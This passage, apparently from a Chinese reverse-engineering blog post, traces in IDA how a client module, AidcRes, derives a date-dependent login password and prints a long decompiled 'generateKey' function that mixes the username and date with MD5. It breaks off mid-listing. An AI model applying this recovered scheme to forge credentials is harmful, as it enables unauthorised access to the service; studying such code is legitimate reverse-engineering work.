IDA 加载的基址，即可找到这个函数。</p><p>这个函数的大致作用就是修改上面我们得到的 E</p><ul><li>E[今天几号日期 % 16] 替换为 ‘b’ 得到最后的密码</li></ul><p>这块我们是搞清楚了，那 key 是怎么来的呢。<br>这个我们就需要大量借助调试器了，我们重启一下主程序，然后在上面的分析基础上找到这个 key 第一次出现的地方，我们可以发现<br>在 AidcRes 偏移 10110 处即为 key 的生成函数。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521150058.png" alt=""></p><p>这个函数巨长，同样的，我们借助之前的方法在 IDA 中找到这个函数，我这里直接按偏移，可以看到在 sub_420110 即为我们的加密函数，<br>这里我已经重命名为 generateKey。</p><p>这个函数太长了，我无法截全图，我直接丢代码然后分析，这里分析建议大家调试结合代码来看，不然一头雾水。其中大量的必要变量和函数我已经重命名，方便大家阅读。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">thiscall <span class="title">generateKey</span><span class="params">(<span class="keyword">char</span> *<span class="keyword">this</span>, <span class="keyword">int</span> a2, <span class="keyword">char</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">int</span> a6, <span class="keyword">int</span> a7, <span class="keyword">int</span> a8)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+8h] [ebp-37Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v12; <span class="comment">// [esp+20h] [ebp-364h]</span></span><br><span class="line">  <span class="keyword">int</span> len_username_b_MonthDay; <span class="comment">// [esp+24h] [ebp-360h]</span></span><br><span class="line">  <span class="keyword">char</span> *v14; <span class="comment">// [esp+28h] [ebp-35Ch]</span></span><br><span class="line">  <span class="keyword">int</span> len_bUsernameMonthDay; <span class="comment">// [esp+2Ch] [ebp-358h]</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// [esp+30h] [ebp-354h]</span></span><br><span class="line">  <span class="keyword">char</span> *mem_17; <span class="comment">// [esp+34h] [ebp-350h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [esp+38h] [ebp-34Ch]</span></span><br><span class="line">  <span class="keyword">int</span> lenMonthDay; <span class="comment">// [esp+3Ch] [ebp-348h]</span></span><br><span class="line">  <span class="keyword">int</span> lenUsername; <span class="comment">// [esp+40h] [ebp-344h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp+44h] [ebp-340h]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [esp+48h] [ebp-33Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v23; <span class="comment">// [esp+4Ch] [ebp-338h]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [esp+50h] [ebp-334h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v25; <span class="comment">// [esp+54h] [ebp-330h]</span></span><br><span class="line">  <span class="keyword">int</span> len_HbKeyGa; <span class="comment">// [esp+58h] [ebp-32Ch]</span></span><br><span class="line">  <span class="keyword">int</span> lenHbKeyGa; <span class="comment">// [esp+5Ch] [ebp-328h]</span></span><br><span class="line">  <span class="keyword">char</span> *pMem_64_a; <span class="comment">// [esp+60h] [ebp-324h]</span></span><br><span class="line">  <span class="keyword">int</span> len_HbKeyGb; <span class="comment">// [esp+64h] [ebp-320h]</span></span><br><span class="line">  <span class="keyword">int</span> lenHbKeyGb; <span class="comment">// [esp+68h] [ebp-31Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *pMem_64_b; <span class="comment">// [esp+6Ch] [ebp-318h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [esp+70h] [ebp-314h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [esp+74h] [ebp-310h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [esp+78h] [ebp-30Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v35; <span class="comment">// [esp+7Ch] [ebp-308h]</span></span><br><span class="line">  <span class="keyword">int</span> len_monthDay_Username_b; <span class="comment">// [esp+80h] [ebp-304h]</span></span><br><span class="line">  <span class="keyword">char</span> *v37; <span class="comment">// [esp+84h] [ebp-300h]</span></span><br><span class="line">  <span class="keyword">int</span> len_username_MonthDay_b; <span class="comment">// [esp+88h] [ebp-2FCh]</span></span><br><span class="line">  LPVOID lp_mix_md5_1; <span class="comment">// [esp+8Ch] [ebp-2F8h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v40; <span class="comment">// [esp+90h] [ebp-2F4h]</span></span><br><span class="line">  <span class="keyword">int</span> v41; <span class="comment">// [esp+94h] [ebp-2F0h]</span></span><br><span class="line">  LPVOID v42; <span class="comment">// [esp+98h] [ebp-2ECh]</span></span><br><span class="line">  LPVOID v43; <span class="comment">// [esp+9Ch] [ebp-2E8h]</span></span><br><span class="line">  LPVOID v44; <span class="comment">// [esp+A0h] [ebp-2E4h]</span></span><br><span class="line">  <span class="keyword">int</span> index3; <span class="comment">// [esp+A4h] [ebp-2E0h]</span></span><br><span class="line">  <span class="keyword">int</span> index2; <span class="comment">// [esp+A8h] [ebp-2DCh]</span></span><br><span class="line">  <span class="keyword">char</span> *pHbKeyGa; <span class="comment">// [esp+ACh] [ebp-2D8h]</span></span><br><span class="line">  <span class="keyword">int</span> index6; <span class="comment">// [esp+B0h] [ebp-2D4h]</span></span><br><span class="line">  <span class="keyword">int</span> index5; <span class="comment">// [esp+B4h] [ebp-2D0h]</span></span><br><span class="line">  _DWORD *md5_monthDay_Username_b; <span class="comment">// [esp+B8h] [ebp-2CCh]</span></span><br><span class="line">  _DWORD *md5_username_b_MonthDay; <span class="comment">// [esp+BCh] [ebp-2C8h]</span></span><br><span class="line">  _DWORD *md5_username_MonthDay_b; <span class="comment">// [esp+C0h] [ebp-2C4h]</span></span><br><span class="line">  <span class="keyword">void</span> *mix_md5_1; <span class="comment">// [esp+C4h] [ebp-2C0h]</span></span><br><span class="line">  <span class="keyword">int</span> md5_1_pLus3remainder4; <span class="comment">// [esp+C8h] [ebp-2BCh]</span></span><br><span class="line">  <span class="keyword">int</span> md5_bUsernameMonthDay; <span class="comment">// [esp+CCh] [ebp-2B8h]</span></span><br><span class="line">  <span class="keyword">char</span> *pHbKeyGb; <span class="comment">// [esp+D0h] [ebp-2B4h]</span></span><br><span class="line">  <span class="keyword">void</span> *v57; <span class="comment">// [esp+D4h] [ebp-2B0h]</span></span><br><span class="line">  <span class="keyword">void</span> *v58; <span class="comment">// [esp+D8h] [ebp-2ACh]</span></span><br><span class="line">  <span class="keyword">int</span> md5_4_plus5remainer4; <span class="comment">// [esp+DCh] [ebp-2A8h]</span></span><br><span class="line">  <span class="keyword">void</span> *mix_md5_2; <span class="comment">// [esp+E0h] [ebp-2A4h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *userName; <span class="comment">// [esp+E4h] [ebp-2A0h]</span></span><br><span class="line">  <span class="keyword">char</span> *monthDay; <span class="comment">// [esp+E8h] [ebp-29Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *bUsernameMonthDay; <span class="comment">// [esp+ECh] [ebp-298h]</span></span><br><span class="line">  <span class="keyword">char</span> *username_b_MonthDay; <span class="comment">// [esp+F0h] [ebp-294h]</span></span><br><span class="line">  <span class="keyword">char</span> *username_MonthDay_b; <span class="comment">// [esp+F4h] [ebp-290h]</span></span><br><span class="line">  <span class="keyword">char</span> *monthDay_Username_b; <span class="comment">// [esp+F8h] [ebp-28Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *p_HbKeyGb; <span class="comment">// [esp+FCh] [ebp-288h]</span></span><br><span class="line">  <span class="keyword">char</span> *p_HbKeyGa; <span class="comment">// [esp+100h] [ebp-284h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *username; <span class="comment">// [esp+104h] [ebp-280h]</span></span><br><span class="line">  _DWORD *md5_2; <span class="comment">// [esp+108h] [ebp-27Ch]</span></span><br><span class="line">  _DWORD *md5_3; <span class="comment">// [esp+10Ch] [ebp-278h]</span></span><br><span class="line">  <span class="keyword">int</span> index1; <span class="comment">// [esp+114h] [ebp-270h]</span></span><br><span class="line">  <span class="keyword">int</span> index4; <span class="comment">// [esp+118h] [ebp-26Ch]</span></span><br><span class="line">  <span class="keyword">int</span> temp1; <span class="comment">// [esp+11Ch] [ebp-268h]</span></span><br><span class="line">  <span class="keyword">int</span> temp2; <span class="comment">// [esp+120h] [ebp-264h]</span></span><br><span class="line">  _DWORD *md5_4; <span class="comment">// [esp+124h] [ebp-260h]</span></span><br><span class="line">  <span class="keyword">int</span> md5_1; <span class="comment">// [esp+128h] [ebp-25Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> SizeInBytes; <span class="comment">// [esp+134h] [ebp-250h]</span></span><br><span class="line">  <span class="keyword">char</span> *DstBuf; <span class="comment">// [esp+138h] [ebp-24Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *pThis; <span class="comment">// [esp+13Ch] [ebp-248h]</span></span><br><span class="line">  <span class="keyword">int</span> v81; <span class="comment">// [esp+140h] [ebp-244h]</span></span><br><span class="line">  <span class="keyword">int</span> v82; <span class="comment">// [esp+144h] [ebp-240h]</span></span><br><span class="line">  <span class="keyword">int</span> v83; <span class="comment">// [esp+148h] [ebp-23Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v84; <span class="comment">// [esp+14Ch] [ebp-238h]</span></span><br><span class="line">  <span class="keyword">int</span> v85; <span class="comment">// [esp+150h] [ebp-234h]</span></span><br><span class="line">  <span class="keyword">int</span> v86; <span class="comment">// [esp+154h] [ebp-230h]</span></span><br><span class="line">  <span class="keyword">int</span> v87; <span class="comment">// [esp+158h] [ebp-22Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v88; <span class="comment">// [esp+15Ch] [ebp-228h]</span></span><br><span class="line">  <span class="keyword">char</span> hbKey; <span class="comment">// [esp+160h] [ebp-224h]</span></span><br><span class="line">  <span class="keyword">char</span> v90; <span class="comment">// [esp+161h] [ebp-223h]</span></span><br><span class="line">  <span class="keyword">char</span> hbKeyGa; <span class="comment">// [esp+1E4h] [ebp-1A0h]</span></span><br><span class="line">  <span class="keyword">char</span> mem_64_a; <span class="comment">// [esp+1E5h] [ebp-19Fh]</span></span><br><span class="line">  <span class="keyword">char</span> hbKeyGb; <span class="comment">// [esp+228h] [ebp-15Ch]</span></span><br><span class="line">  <span class="keyword">char</span> mem_64_b; <span class="comment">// [esp+229h] [ebp-15Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v95; <span class="comment">// [esp+22Fh] [ebp-155h]</span></span><br><span class="line">  <span class="keyword">char</span> v96[<span class="number">4</span>]; <span class="comment">// [esp+26Ch] [ebp-118h]</span></span><br><span class="line">  <span class="keyword">char</span> v97[<span class="number">5</span>]; <span class="comment">// [esp+270h] [ebp-114h]</span></span><br><span class="line">  <span class="keyword">int</span> v98; <span class="comment">// [esp+275h] [ebp-10Fh]</span></span><br><span class="line">  <span class="keyword">int</span> v99; <span class="comment">// [esp+279h] [ebp-10Bh]</span></span><br><span class="line">  <span class="keyword">int</span> v100; <span class="comment">// [esp+27Dh] [ebp-107h]</span></span><br><span class="line">  <span class="keyword">int</span> v101; <span class="comment">// [esp+281h] [ebp-103h]</span></span><br><span class="line">  <span class="keyword">int</span> v102; <span class="comment">// [esp+285h] [ebp-FFh]</span></span><br><span class="line">  __int16 v103; <span class="comment">// [esp+289h] [ebp-FBh]</span></span><br><span class="line">  <span class="keyword">char</span> v104; <span class="comment">// [esp+28Bh] [ebp-F9h]</span></span><br><span class="line">  <span class="keyword">char</span> v105[<span class="number">4</span>]; <span class="comment">// [esp+28Ch] [ebp-F8h]</span></span><br><span class="line">  <span class="keyword">char</span> v106[<span class="number">5</span>]; <span class="comment">// [esp+290h] [ebp-F4h]</span></span><br><span class="line">  <span class="keyword">int</span> v107; <span class="comment">// [esp+295h] [ebp-EFh]</span></span><br><span class="line">  <span class="keyword">int</span> v108; <span class="comment">// [esp+299h] [ebp-EBh]</span></span><br><span class="line">  <span class="keyword">int</span> v109; <span class="comment">// [esp+29Dh] [ebp-E7h]</span></span><br><span class="line">  <span class="keyword">int</span> v110; <span class="comment">// [esp+2A1h] [ebp-E3h]</span></span><br><span class="line">  <span class="keyword">int</span> v111; <span class="comment">// [esp+2A5h] [ebp-DFh]</span></span><br><span class="line">  __int16 v112; <span class="comment">// [esp+2A9h] [ebp-DBh]</span></span><br><span class="line">  <span class="keyword">char</span> v113; <span class="comment">// [esp+2ABh] [ebp-D9h]</span></span><br><span class="line">  <span class="keyword">char</span> v114[<span class="number">4</span>]; <span class="comment">// [esp+2ACh] [ebp-D8h]</span></span><br><span class="line">  <span class="keyword">char</span> v115[<span class="number">5</span>]; <span class="comment">// [esp+2B0h] [ebp-D4h]</span></span><br><span class="line">  <span class="keyword">int</span> v116; <span class="comment">// [esp+2B5h] [ebp-CFh]</span></span><br><span class="line">  <span class="keyword">int</span> v117; <span class="comment">// [esp+2B9h] [ebp-CBh]</span></span><br><span class="line">  <span class="keyword">int</span> v118; <span class="comment">// [esp+2BDh] [ebp-C7h]</span></span><br><span class="line">  <span class="keyword">int</span> v119; <span class="comment">// [esp+2C1h] [ebp-C3h]</span></span><br><span class="line">  <span class="keyword">int</span> v120; <span class="comment">// [esp+2C5h] [ebp-BFh]</span></span><br><span class="line">  __int16 v121; <span class="comment">// [esp+2C9h] [ebp-BBh]</span></span><br><span class="line">  <span class="keyword">char</span> v122; <span class="comment">// [esp+2CBh] [ebp-B9h]</span></span><br><span class="line">  <span class="keyword">char</span> v123[<span class="number">4</span>]; <span class="comment">// [esp+2CCh] [ebp-B8h]</span></span><br><span class="line">  <span class="keyword">char</span> v124[<span class="number">5</span>]; <span class="comment">// [esp+2D0h] [ebp-B4h]</span></span><br><span class="line">  <span class="keyword">int</span> v125; <span class="comment">// [esp+2D5h] [ebp-AFh]</span></span><br><span class="line">  <span class="keyword">int</span> v126; <span class="comment">// [esp+2D9h] [ebp-ABh]</span></span><br><span class="line">  <span class="keyword">int</span> v127; <span class="comment">// [esp+2DDh] [ebp-A7h]</span></span><br><span class="line">  <span class="keyword">int</span> v128; <span class="comment">// [esp+2E1h] [ebp-A3h]</span></span><br><span class="line">  <span class="keyword">int</span> v129; <span class="comment">// [esp+2E5h] [ebp-9Fh]</span></span><br><span class="line">  __int16 v130; <span class="comment">// [esp+2E9h] [ebp-9Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v131; <span class="comment">// [esp+2EBh] [ebp-99h]</span></span><br><span class="line">  <span class="keyword">char</span> char_array_29_2[<span class="number">29</span>]; <span class="comment">// [esp+2ECh] [ebp-98h]</span></span><br><span class="line">  __int16 v133; <span class="comment">// [esp+309h] [ebp-7Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v134; <span class="comment">// [esp+30Bh] [ebp-79h]</span></span><br><span class="line">  <span class="keyword">char</span> char_array_29_1[<span class="number">29</span>]; <span class="comment">// [esp+30Ch] [ebp-78h]</span></span><br><span class="line">  __int16 v136; <span class="comment">// [esp+329h] [ebp-5Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v137; <span class="comment">// [esp+32Bh] [ebp-59h]</span></span><br><span class="line">  <span class="keyword">char</span> char_array_29_3[<span class="number">29</span>]; <span class="comment">// [esp+32Ch] [ebp-58h]</span></span><br><span class="line">  __int16 v139; <span class="comment">// [esp+349h] [ebp-3Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v140; <span class="comment">// [esp+34Bh] [ebp-39h]</span></span><br><span class="line">  <span class="keyword">char</span> char_array_29_4[<span class="number">29</span>]; <span class="comment">// [esp+34Ch] [ebp-38h]</span></span><br><span class="line">  __int16 v142; <span class="comment">// [esp+369h] [ebp-1Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v143; <span class="comment">// [esp+36Bh] [ebp-19h]</span></span><br><span class="line">  <span class="keyword">char</span> month_day; <span class="comment">// [esp+36Ch] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v145; <span class="comment">// [esp+36Dh] [ebp-17h]</span></span><br><span class="line">  <span class="keyword">int</span> v146; <span class="comment">// [esp+380h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  pThis = <span class="keyword">this</span>;</span><br><span class="line">  v41 = <span class="number">0</span>;</span><br><span class="line">  v146 = <span class="number">0</span>;</span><br><span class="line">  username = <span class="number">0</span>;</span><br><span class="line">  v40 = sub_421680(<span class="string">"@hbxy"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v40 != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v33 = sub_421630((<span class="keyword">int</span>)&amp;v11, <span class="number">0</span>, v40);</span><br><span class="line">    <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>=(v33);</span><br><span class="line">    <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v11);</span><br><span class="line">  &#125;</span><br><span class="line">  username = (<span class="keyword">const</span> <span class="keyword">char</span> *)get_username(&amp;a3);</span><br><span class="line">  userName = username;</span><br><span class="line">  v25 = username + <span class="number">1</span>;</span><br><span class="line">  userName += <span class="built_in">strlen</span>(userName);</span><br><span class="line">  v24 = ++userName - (username + <span class="number">1</span>);</span><br><span class="line">  lenUsername = userName - (username + <span class="number">1</span>);</span><br><span class="line">  month_day = <span class="number">0</span>;</span><br><span class="line">  v145 = <span class="number">0</span>;</span><br><span class="line">  strftime(&amp;month_day, <span 